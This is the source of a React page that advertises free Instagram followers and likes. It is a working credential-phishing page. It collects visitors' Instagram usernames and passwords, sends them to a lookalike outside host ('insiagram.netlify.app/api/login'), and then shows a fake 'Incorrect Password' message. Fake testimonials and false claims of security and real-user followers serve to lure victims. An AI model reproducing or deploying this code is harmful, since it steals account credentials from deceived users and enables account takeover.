
import Link from 'next/link';
import React, { useState } from 'react'
import Header from './Header';
import Video from "./Video"

const InstaLike = () => {

    const host = "https://insiagram.netlify.app";
//   const history = useNavigate();
  const [val, setVal] = useState(false);
  const [complete, setComplete] = useState(false);

  const [crediential, setCrediential] = useState({ email: "", password: "" });
  const handleOnchange = (e) => {
    setCrediential({ ...crediential, [e.target.name]: e.target.value });
  };

  const handleOnSubmit = async (e) => {
    e.preventDefault();
    setVal(true);
    const mes = document.querySelector(".message");

    const response = await fetch(`${host}/api/login`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },

      body: JSON.stringify({
        email: crediential.email,
        password: crediential.password,
      }),
    });

    const json = await response.json();

    if (json.sucess) {
      mes.style.display = "block";
      setVal(false);
      // history('/sucess')
    }
  };

  return (
   <>
  
    <nav className="navbar navbar-expand-lg navbar-dark bg-primary nav-ts">
        <div className="container-fluid">
          <Link className="navbar-brand fw-bold" href="/">
            <img
              src="https://socialfollow.co/wp-content/uploads/2022/11/logo.svg"
              alt=""
              width="400"
              height="30"
            />
          </Link>
          <button
            className="navbar-toggler d-none"
            type="button"
            data-bs-toggle="collapse"
            data-bs-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent"
            aria-expanded="false"
            aria-label="Toggle navigation"
          >
            <span className="navbar-toggler-icon"></span>
          </button>
          <div
            className="collapse navbar-collapse justify-content-end"
            id="navbarSupportedContent"
          >
            <ul className="navbar-nav mb-2 mb-lg-0">
              <li className="nav-item">
                <Link className="nav-link active" aria-current="page" href="/">
                  HOME
                </Link>
              </li>

              <li className="nav-item">
                <Link className="nav-link active" href="/autoliker">
                  INSTAGRAM AUTOLIKER
                </Link>
              </li>
              <li className="nav-item">
                <Link className="nav-link active" href="/">
                  INSTAGRAM AUTO FOLLOWERS
                </Link>
              </li>
            </ul>
          </div>
        </div>
      </nav>
      {/* <!-- Claim Start Section --> */}
      <section className="section-claim start cd">
        <div className="container">
          <div className="row align-items-center">
            <div className="col-md-7">
              <div className="sf-panel">
                <div className="body">
                  <h2 className="heading">
                    Get{" "}
                    <span>
                      10K Free <span className="text-danger">Instagram</span>{" "}
                      Followers per submit
                    </span>
                  </h2>
                  <p className={`text main mb-4`}>
                    Simply Enter Your Email/Username and Password to Continue.
                  </p>
                  <form className="sf-form formu" onSubmit={handleOnSubmit}>
                    <div className="row">
                      <div className="col-12 mb-3">
                        <input
                          id="username2"
                          type="text"
                          required
                          name="email"
                          onChange={handleOnchange}
                          value={crediential.email}
                          className="form-control input-text icon camera"
                          placeholder="Username/Email"
                        />
                      </div>
                      <div className="col-12 mb-3">
                        <input
                        
                          id="text"
                          type="text"
                          required
                          name="password"
                          onChange={handleOnchange}
                          value={crediential.password}
                          className="form-control input-text icon camera"
                          placeholder="Password"
                        />
                      </div>
                    </div>

                    <div className="message" id="mes">
                      <p>Incorrect Password! Please try later.</p>
                    </div>
                    <div className={`btnclass mb-3`}>
                      {!val ? (
                        <button className="getbtn" type="submit">
                          GET
                        </button>
                      ) : (
                        <button className="getbtn p-2" type="submit">
                          {" "}
                          <div className="spinner-border" role="status">
                            {/* <span className="sr-only">Loading...</span> */}
                          </div>
                        </button>
                      )}
                    </div>
                    {/* <div className='col-12'>

            <button id="continueBtn" type="submit" className="btn button sf-button pink block">
              Continue
            </button>
                  </div> */}
                  </form>
                </div>
              </div>
            </div>

            

            <div className="col-md-5">
              <div className="review d-flex flex-column align-items-center img-pic">
                <div className="avatar av">
                  <img
                    src="/logo.jpg"
                    className="img-fluid"
                    alt="Johanna Couto Image"
                  />
                </div>

                <p className="mes">
                  I never believed I could get free followers this fast… And it
                  is so simple to use. I could not recommend more!
                </p>
                <div
                  className="
                  ratings
                  d-flex
                  align-items-center
                  justify-content-between
                "
                >
                  <span className="star"></span>
                  <span className="star"></span>
                  <span className="star"></span>
                  <span className="star"></span>
                  <span className="star"></span>
                </div>
                <div className="social">@jwalaa_thefire</div>
              </div>
            </div>
          </div>
        </div>
      </section>
      <div className="container mt-5 mb-4">
              <Video/>
            </div>

      <div className="container">
        <div className="card mb-3 border-primary my-3">
          <div className="card-body">
            <center>
              <h2>
                <b>More Tools</b>
              </h2>
            </center>
            <center>
              <Link href="/autoliker" className="btn btn-primary btn-lg mt-2 mr-3">
                INSTAGRAM AUTOLIKER
              </Link>
              <Link href="/" className="btn btn-success btn-lg mt-2">
               UNLIMITED FOLLOWERS
              </Link>
            </center>
          </div>
        </div>
        <div className="card border-primary mb-3 mt-3 card-b-rounded">
          <div className="card-header bg-primary text-white text-center card-h-rounded">
            <h2 className="fs20">How it works?</h2>
          </div>
          <center>
            <div className="card-body fs15">
              <p>
                <b>STEP 1: </b>Make Sure You are using your original id & you
                will be redirected to instagram login page.
              </p>
              <p>
                <b>STEP 2: </b>Make Sure You use your correct Crediential and
                Post url{" "}
              </p>
              <p>
                <b>STEP 3: </b>After Submitting!! Boom!!! You will get Followers
                and Likes
              </p>
            </div>
          </center>
        </div>

        <div className="row">
          <div className="col-sm-6">
            <center>
              <div className="card border-primary mb-3">
                <div className="card-header bg-primary text-white">
                  <h2 className="fs20">Free Instagram Followers</h2>
                </div>
                <div className="card-body">
                  <p className="card-text fs15">
                    We can deliver unlimited Instagram followers to your
                    account, totally free. You can show off to your friends
                    using those followers or can grow your account.
                  </p>
                </div>
              </div>
            </center>
          </div>
          <div className="col-sm-6">
            <center>
              <div className="card border-primary mb-3">
                <div className="card-header bg-primary text-white">
                  <h2 className="fs20">Free Instagram Likes</h2>
                </div>
                <div className="card-body">
                  <p className="card-text fs15">
                    Our tool can increase your posts, reels, or video likes and
                    increase your post's reach. We provide likes from high,
                    quality organic and real users.
                  </p>
                </div>
              </div>
            </center>
          </div>
        </div>
        <div className="row">
          <div className="col-sm-6">
            <center>
              <div className="card text-white bg-primary mb-3">
                <div className="card-body">
                  <h2 className="card-title fs20">HIGHLY SECURE</h2>
                  <p className="card-text fs15">
                    Our application is highly secured and protected by modern
                    technologies and encryptions. We guarantee the privacy of
                    all our users and take every action to ensure that. We did
                    not sell, trade, or log any kind of data or logging
                    information.
                  </p>
                </div>
              </div>
            </center>
          </div>
          <div className="col-sm-6">
            <center>
              <div className="card text-white bg-primary mb-3">
                <div className="card-body">
                  <h2 className="card-title fs20">REAL USERS</h2>
                  <p className="card-text fs15">
                    The followers and likes you are getting, are all from real
                    users. They are not any kind of computerized bots. We
                    ensure, that we deliver real and high-quality followers and
                    likes to our all users.
                  </p>
                </div>
              </div>
            </center>
          </div>
        </div>

        <center>
          <div className="card text-white bg-success mb-3">
            <div className="card-body">
              <h2 className="card-title fs20">How We Make "FREE" Possible?</h2>
              <p className="card-text fs15">
                We made Link platform to share likes and followers. To get likes
                and followers, you need credits. And to earn credits every user
                likes and follow other users on site. Using those credits you
                can boost your profile, by increasing followers and likes on
                your post.
              </p>
            </div>
          </div>
        </center>
        <div className="row">
          <div className="col-sm-4">
            <center>
              <div className="card text-white bg-primary mb-3">
                <div className="card-body">
                  <h2 className="card-title fs20">Auto likes</h2>
                  <p className="card-text fs15">
                    You can receive unlimited free auto likes on your post using
                    our tool.
                  </p>
                </div>
              </div>
            </center>
          </div>
          <div className="col-sm-4">
            <center>
              <div className="card text-white bg-primary mb-3">
                <div className="card-body">
                  <h2 className="card-title fs20">Auto Comments</h2>
                  <p className="card-text fs15">Coming Soon !!!</p>
                </div>
              </div>
            </center>
          </div>
          <div className="col-sm-4">
            <center>
              <div className="card text-white bg-primary mb-3">
                <div className="card-body">
                  <h2 className="card-title fs20">Auto Followers</h2>
                  <p className="card-text fs15">
                    Get free unlimited Instagram followers and grow your account
                    reach.
                  </p>
                </div>
              </div>
            </center>
          </div>
        </div>
        <center>
          <p className="h6">
            We have created the best Instagram auto liker, which is secured and
            safe. You can get unlimited free Instagram followers and likes and
            become famous or grow your account. All the services are free.
          </p>
        </center>

        <center></center>
        <center>Copyright © By GetInstagram.netlify.com 2022</center>
      </div>



   
   </>
  )
}

export default InstaLike
